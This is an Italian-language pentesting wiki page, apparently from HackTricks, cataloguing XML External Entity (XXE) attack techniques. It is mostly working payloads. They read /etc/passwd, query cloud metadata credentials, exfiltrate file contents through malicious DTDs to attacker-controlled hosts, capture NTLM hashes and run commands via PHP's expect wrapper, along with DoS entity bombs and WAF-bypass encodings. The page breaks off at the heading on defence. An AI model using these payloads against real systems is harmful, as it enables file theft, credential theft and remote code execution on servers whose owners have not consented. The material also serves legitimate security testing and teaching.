# XXE - XEE - Entit√† Esterna XML

<details>

<summary><strong>Impara l'hacking su AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Concetti di base XML

XML √® un linguaggio di markup progettato per lo storage e il trasporto dei dati, caratterizzato da una struttura flessibile che consente l'uso di tag denominati in modo descrittivo. Si differenzia dall'HTML per non essere limitato a un insieme di tag predefiniti. Nonostante il suo ruolo iniziale nella tecnologia AJAX, l'importanza di XML √® diminuita con l'aumento di JSON.

* **Rappresentazione dei Dati tramite Entit√†**: Le entit√† in XML consentono la rappresentazione dei dati, inclusi caratteri speciali come `&lt;` e `&gt;`, che corrispondono a `<` e `>` per evitare conflitti con il sistema di tag di XML.
* **Definizione degli Elementi XML**: XML consente la definizione dei tipi di elementi, delineando come gli elementi dovrebbero essere strutturati e quale contenuto possono contenere, che va da qualsiasi tipo di contenuto a elementi figlio specifici.
* **Definizione del Tipo di Documento (DTD)**: Le DTD sono cruciali in XML per definire la struttura del documento e i tipi di dati che pu√≤ contenere. Possono essere interne, esterne o una combinazione, guidando la formattazione e la convalida dei documenti.
* **Entit√† Personalizzate ed Esterne**: XML supporta la creazione di entit√† personalizzate all'interno di una DTD per una rappresentazione flessibile dei dati. Le entit√† esterne, definite con un URL, sollevano preoccupazioni sulla sicurezza, in particolare nel contesto degli attacchi di Entit√† Esterna XML (XXE), che sfruttano il modo in cui i parser XML gestiscono le fonti di dati esterne: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **Rilevamento XXE con Entit√† Parametro**: Per rilevare vulnerabilit√† XXE, specialmente quando i metodi convenzionali falliscono a causa delle misure di sicurezza del parser, possono essere utilizzate le entit√† parametro XML. Queste entit√† consentono tecniche di rilevamento out-of-band, come attivare ricerche DNS o richieste HTTP a un dominio controllato, per confermare la vulnerabilit√†.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Principali attacchi

[**La maggior parte di questi attacchi sono stati testati utilizzando i fantastici laboratori XEE di Portswiggers: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Nuovo test di Entit√†

In questo attacco tester√≤ se una semplice nuova dichiarazione di ENTIT√Ä funziona
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Leggere il file

Proviamo a leggere `/etc/passwd` in modi diversi. Per Windows potresti provare a leggere: `C:\windows\system32\drivers\etc\hosts`

In questo primo caso, nota che SYSTEM "_\*\*file:///\*\*etc/passwd_" funzioner√† anche.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Questo secondo caso dovrebbe essere utile per estrarre un file se il server web sta utilizzando PHP (Non √® il caso dei laboratori di Portswiggers)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
In questo terzo caso notiamo che stiamo dichiarando l'`Element stockCheck` come ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Elenco delle directory

Nelle applicazioni basate su **Java**, potrebbe essere possibile **elencare i contenuti di una directory** tramite XXE con un payload come (chiedendo solo l'elenco della directory anzich√© del file):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Un XXE potrebbe essere utilizzato per abusare di un SSRF all'interno di un cloud
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### SSRF Cieco

Utilizzando la **tecnica precedentemente commentata** √® possibile fare in modo che il server acceda a un server da te controllato per mostrarne la vulnerabilit√†. Tuttavia, se ci√≤ non funziona, potrebbe essere perch√© le **entit√† XML non sono consentite**, in tal caso potresti provare a utilizzare le **entit√† di parametro XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Esfiltrare dati out-of-band

**In questa occasione faremo caricare al server un nuovo DTD con un payload dannoso che invier√† il contenuto di un file tramite una richiesta HTTP (**per **file multi-linea potresti provare a esfiltrarlo tramite** _**ftp://**_ utilizzando ad esempio questo server di base [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Questa spiegazione si basa sul** [**laboratorio di Portswigger qui**](https://portswigger.net/web-security/xxe/blind)**.**

Nel DTD dannoso fornito, vengono eseguiti una serie di passaggi per esfiltrare dati:

### Esempio di DTD dannoso:

La struttura √® la seguente:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
I passaggi eseguiti da questa DTD includono:

1. **Definizione delle Entit√† Parametro:**
   * Viene creato un'entit√† parametro XML, `%file`, che legge il contenuto del file `/etc/hostname`.
   * Un'altra entit√† parametro XML, `%eval`, viene definita. Dichiara dinamicamente una nuova entit√† parametro XML, `%exfiltrate`. L'entit√† `%exfiltrate` √® impostata per effettuare una richiesta HTTP al server dell'attaccante, passando il contenuto dell'entit√† `%file` nella stringa di query dell'URL.
2. **Esecuzione delle Entit√†:**
   * Viene utilizzata l'entit√† `%eval`, portando all'esecuzione della dichiarazione dinamica dell'entit√† `%exfiltrate`.
   * L'entit√† `%exfiltrate` viene quindi utilizzata, innescando una richiesta HTTP all'URL specificato con il contenuto del file.

L'attaccante ospita questa DTD dannosa su un server sotto il loro controllo, tipicamente all'URL come `http://web-attacker.com/malicious.dtd`.

**Payload XXE:** Per sfruttare un'applicazione vulnerabile, l'attaccante invia un payload XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Questo payload definisce un'entit√† di parametro XML `%xxe` e la incorpora all'interno del DTD. Quando elaborato da un parser XML, questo payload recupera il DTD esterno dal server dell'attaccante. Il parser interpreta quindi il DTD in linea, eseguendo i passaggi delineati nel DTD dannoso e portando all'esfiltrazione del file `/etc/hostname` al server dell'attaccante.

### Basato sull'errore (DTD esterno)

**In questo caso faremo in modo che il server carichi un DTD dannoso che mostrer√† il contenuto di un file all'interno di un messaggio di errore (questo √® valido solo se √® possibile visualizzare i messaggi di errore).** [**Esempio da qui.**](https://portswigger.net/web-security/xxe/blind)

Un messaggio di errore di analisi XML, rivelando i contenuti del file `/etc/passwd`, pu√≤ essere attivato utilizzando una maliziosa Definizione del Tipo di Documento (DTD) esterna. Ci√≤ viene realizzato attraverso i seguenti passaggi:

1. Viene definita un'entit√† di parametro XML chiamata `file`, che contiene i contenuti del file `/etc/passwd`.
2. Viene definita un'entit√† di parametro XML chiamata `eval`, che incorpora una dichiarazione dinamica per un'altra entit√† di parametro XML chiamata `error`. Questa entit√† `error`, quando valutata, tenta di caricare un file inesistente, incorporando i contenuti dell'entit√† `file` come suo nome.
3. Viene invocata l'entit√† `eval`, portando alla dichiarazione dinamica dell'entit√† `error`.
4. L'invocazione dell'entit√† `error` porta al tentativo di caricare un file inesistente, producendo un messaggio di errore che include i contenuti del file `/etc/passwd` come parte del nome del file.

Il DTD esterno malizioso pu√≤ essere invocato con il seguente XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
All'esecuzione, la risposta del server web dovrebbe includere un messaggio di errore che visualizza il contenuto del file `/etc/passwd`.

![](<../.gitbook/assets/image (223) (1).png>)

_**Si noti che il DTD esterno ci consente di includere un'entit√† all'interno della seconda (****`eval`****), ma √® proibito nel DTD interno. Pertanto, non √® possibile forzare un errore senza utilizzare un DTD esterno (di solito).**_

### **Basato sull'errore (DTD di sistema)**

E per le vulnerabilit√† XXE basate sull'errore quando le **interazioni out-of-band sono bloccate** (le connessioni esterne non sono disponibili)?.

Una falla nella specifica del linguaggio XML pu√≤ **esporre dati sensibili attraverso messaggi di errore quando il DTD di un documento mescola dichiarazioni interne ed esterne**. Questo problema consente la ridefinizione interna delle entit√† dichiarate esternamente, facilitando l'esecuzione di attacchi XXE basati sull'errore. Tali attacchi sfruttano la ridefinizione di un'entit√† di parametro XML, originariamente dichiarata in un DTD esterno, da parte di un DTD interno. Quando le connessioni out-of-band sono bloccate dal server, gli attaccanti devono fare affidamento su file DTD locali per condurre l'attacco, mirando a indurre un errore di parsing per rivelare informazioni sensibili.

Consideriamo uno scenario in cui il filesystem del server contiene un file DTD in `/usr/local/app/schema.dtd`, che definisce un'entit√† chiamata `custom_entity`. Un attaccante pu√≤ indurre un errore di parsing XML rivelando il contenuto del file `/etc/passwd` inviando un DTD ibrido come segue:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
I passaggi delineati vengono eseguiti da questo DTD:

* La definizione di un'entit√† di parametro XML chiamata `local_dtd` include il file DTD esterno situato sul filesystem del server.
* Si verifica una ridefinizione per l'entit√† di parametro XML `custom_entity`, originariamente definita nel DTD esterno, per incapsulare un [exploit XXE basato su errori](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Questa ridefinizione √® progettata per provocare un errore di parsing, esponendo i contenuti del file `/etc/passwd`.
* Utilizzando l'entit√† `local_dtd`, il DTD esterno viene coinvolto, includendo la nuova entit√† `custom_entity` definita. Questa sequenza di azioni provoca l'emissione del messaggio di errore mirato dall'exploit.

**Esempio del mondo reale:** I sistemi che utilizzano l'ambiente desktop GNOME spesso hanno un DTD in `/usr/share/yelp/dtd/docbookx.dtd` contenente un'entit√† chiamata `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Poich√© questa tecnica utilizza un **DTD interno, √® necessario trovare prima un valido**. Puoi fare ci√≤ **installando** lo stesso **OS / Software** che il server sta utilizzando e **cercando alcuni DTD predefiniti**, oppure **ottenere un elenco** di **DTD predefiniti** all'interno dei sistemi e **verificare** se ne esiste uno:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Per ulteriori informazioni consulta [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Trovare DTD all'interno del sistema

Nel seguente repository github fantastico puoi trovare **percorsi di DTD che possono essere presenti nel sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Inoltre, se hai **l'immagine Docker del sistema della vittima**, puoi utilizzare lo strumento dello stesso repository per **scansionare** l'**immagine** e **trovare** il percorso dei **DTD** presenti all'interno del sistema. Leggi il [Readme del github](https://github.com/GoSecure/dtd-finder) per saperne di pi√π.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE tramite parser di Office Open XML

Per una spiegazione pi√π approfondita di questo attacco, **controlla la seconda sezione di** [**questo post incredibile**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **da Detectify**.

La capacit√† di **caricare documenti di Microsoft Office √® offerta da molte applicazioni web**, che procedono poi ad estrarre determinati dettagli da questi documenti. Ad esempio, un'applicazione web potrebbe consentire agli utenti di importare dati caricando un foglio di calcolo in formato XLSX. Affinch√© il parser possa estrarre i dati dal foglio di calcolo, sar√† inevitabilmente necessario analizzare almeno un file XML.

Per testare questa vulnerabilit√†, √® necessario creare un **file di Microsoft Office contenente un payload XXE**. Il primo passo √® creare una directory vuota in cui il documento pu√≤ essere decompresso.

Una volta che il documento √® stato decompresso, il file XML situato in `./unzipped/word/document.xml` dovrebbe essere aperto e modificato in un editor di testo preferito (come vim). L'XML dovrebbe essere modificato per includere il payload XXE desiderato, spesso iniziando con una richiesta HTTP.

Le righe XML modificate dovrebbero essere inserite tra i due oggetti XML radice. √à importante sostituire l'URL con un URL monitorabile per le richieste.

Infine, il file pu√≤ essere zippato per creare il file malintenzionato poc.docx. Dalla directory "unzipped" precedentemente creata, dovrebbe essere eseguito il seguente comando:

Ora, il file creato pu√≤ essere caricato nell'applicazione web potenzialmente vulnerabile, e si pu√≤ sperare che una richiesta appaia nei log di Burp Collaborator.

### Protocollo Jar

Il protocollo **jar** √® accessibile esclusivamente all'interno delle **applicazioni Java**. √à progettato per consentire l'accesso ai file all'interno di un archivio **PKZIP** (ad es., `.zip`, `.jar`, ecc.), rivolgendosi sia ai file locali che remoti.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Per poter accedere ai file all'interno dei file PKZIP √® **molto utile per abusare di XXE tramite i file DTD di sistema.** Controlla [questa sezione per imparare come abusare dei file DTD di sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Il processo di accesso a un file all'interno di un archivio PKZIP tramite il protocollo jar coinvolge diversi passaggi:

1. Viene effettuata una richiesta HTTP per scaricare l'archivio zip da una posizione specificata, come `https://download.website.com/archive.zip`.
2. La risposta HTTP contenente l'archivio viene temporaneamente memorizzata nel sistema, tipicamente in una posizione come `/tmp/...`.
3. L'archivio viene quindi estratto per accedere ai suoi contenuti.
4. Viene letto il file specifico all'interno dell'archivio, `file.zip`.
5. Dopo l'operazione, eventuali file temporanei creati durante questo processo vengono eliminati.

Una tecnica interessante per interrompere questo processo al secondo passaggio coinvolge mantenere aperta indefinitamente la connessione del server durante il servizio del file di archivio. Gli strumenti disponibili in [questo repository](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) possono essere utilizzati a tale scopo, inclusi un server Python (`slow_http_server.py`) e un server Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Scrivere file in una directory temporanea pu√≤ aiutare a **escalare un'altra vulnerabilit√† che coinvolge una traversata del percorso** (come inclusione di file locale, iniezione di template, XSLT RCE, deserializzazione, ecc).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Attacco delle Mille Risate
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Attacco Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Attacco di sovraccarico quadratico

![](<../.gitbook/assets/image (531).png>)

#### Ottenere NTML

Su host Windows √® possibile ottenere l'hash NTML dell'utente del server web impostando un gestore responder.py:
```bash
Responder.py -I eth0 -v
```
e inviando la seguente richiesta
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Superfici XXE Nascoste

### XInclude

Quando si integra i dati del client nei documenti XML lato server, come quelli nelle richieste SOAP di backend, il controllo diretto sulla struttura XML √® spesso limitato, ostacolando gli attacchi XXE tradizionali a causa delle restrizioni sulla modifica dell'elemento `DOCTYPE`. Tuttavia, un attacco `XInclude` fornisce una soluzione consentendo l'inserimento di entit√† esterne all'interno di qualsiasi elemento di dati del documento XML. Questo metodo √® efficace anche quando solo una parte dei dati all'interno di un documento XML generato dal server pu√≤ essere controllata.

Per eseguire un attacco `XInclude`, lo spazio dei nomi `XInclude` deve essere dichiarato e il percorso del file per l'entit√† esterna prevista deve essere specificato. Di seguito √® riportato un esempio succinto di come un tale attacco possa essere formulato:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Controlla [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) per ulteriori informazioni!

### SVG - Caricamento File

I file caricati dagli utenti su determinate applicazioni, che vengono poi elaborati sul server, possono sfruttare vulnerabilit√† nel modo in cui vengono gestiti i file XML o i file contenenti XML. Formati di file comuni come i documenti di office (DOCX) e le immagini (SVG) si basano su XML.

Quando gli utenti **caricano immagini**, queste immagini vengono elaborate o convalidate lato server. Anche per le applicazioni che si aspettano formati come PNG o JPEG, la **libreria di elaborazione immagini del server potrebbe supportare anche immagini SVG**. Poich√© SVG √® un formato basato su XML, pu√≤ essere sfruttato dagli attaccanti per inviare immagini SVG dannose, esponendo cos√¨ il server a vulnerabilit√† XXE (XML External Entity).

Di seguito √® mostrato un esempio di tale exploit, in cui un'immagine SVG dannosa tenta di leggere file di sistema:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Un altro metodo prevede il tentativo di **eseguire comandi** tramite il wrapper PHP "expect":
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
In entrambi i casi, il formato SVG viene utilizzato per lanciare attacchi che sfruttano le capacit√† di elaborazione XML del software del server, evidenziando la necessit√† di una robusta convalida dell'input e misure di sicurezza.

Controlla [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) per ulteriori informazioni!

**Nota che la prima riga del file letto o del risultato dell'esecuzione apparir√† DENTRO l'immagine creata. Quindi √® necessario poter accedere all'immagine creata da SVG.**

### **PDF - Caricamento file**

Leggi il seguente post per **imparare come sfruttare un XXE caricando un file PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Da x-www-urlencoded a XML

Se una richiesta POST accetta i dati in formato XML, potresti provare a sfruttare un XXE in quella richiesta. Ad esempio, se una richiesta normale contiene quanto segue:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Quindi potresti essere in grado di inviare la seguente richiesta, ottenendo lo stesso risultato:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Da JSON a XEE

Per modificare la richiesta, potresti utilizzare un'estensione di Burp chiamata "**Content Type Converter**". [Qui](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) puoi trovare questo esempio:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Un altro esempio pu√≤ essere trovato [qui](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypass di WAF e Protezioni

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Questo funziona solo se il server XML accetta il protocollo `data://`.

### UTF-7

Puoi utilizzare il \[**"Encode Recipe**" di cyberchef qui ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) trasformare in UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass del Protocollo File:/

Se il sito web utilizza PHP, anzich√© utilizzare `file:/` puoi utilizzare i **wrapper php** `php://filter/convert.base64-encode/resource=` per **accedere ai file interni**.

Se il sito web utilizza Java, potresti controllare il [**protocollo jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entit√† HTML

Trucco da [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Puoi creare una **entit√† all'interno di un'altra entit√†** codificandola con **entit√† html** e poi chiamarla per **caricare un dtd**.\
Nota che le **Entit√† HTML** utilizzate devono essere **numeriche** (come \[in questo esempio]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Esempio DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Wrapper PHP

### Base64

**Estrai** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Estrarre risorse esterne**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Esecuzione remota di codice

**Se il modulo "expect" di PHP √® caricato**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

---

### **XML External Entity (XXE) Attack**

Un attacco di entit√† esterna XML (XXE) sfrutta le vulnerabilit√† presenti nei parser XML per eseguire attivit√† malevole come il recupero di file sensibili, l'esecuzione di codice remoto e altro ancora. Gli attaccanti possono sfruttare questa vulnerabilit√† per visualizzare file sul server o eseguire azioni non autorizzate.

#### **Come funziona l'attacco XXE?**

Durante un attacco XXE, un attaccante inserisce entit√† esterne malevole in un documento XML. Quando il parser XML elabora il documento, le entit√† esterne vengono risolte e possono essere utilizzate per eseguire azioni dannose.

#### **Esempio di payload XXE**

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Nell'esempio sopra, il payload XXE recupera il file `/etc/passwd` dal server di destinazione.

#### **Come difendersi dagli attacchi XXE?**

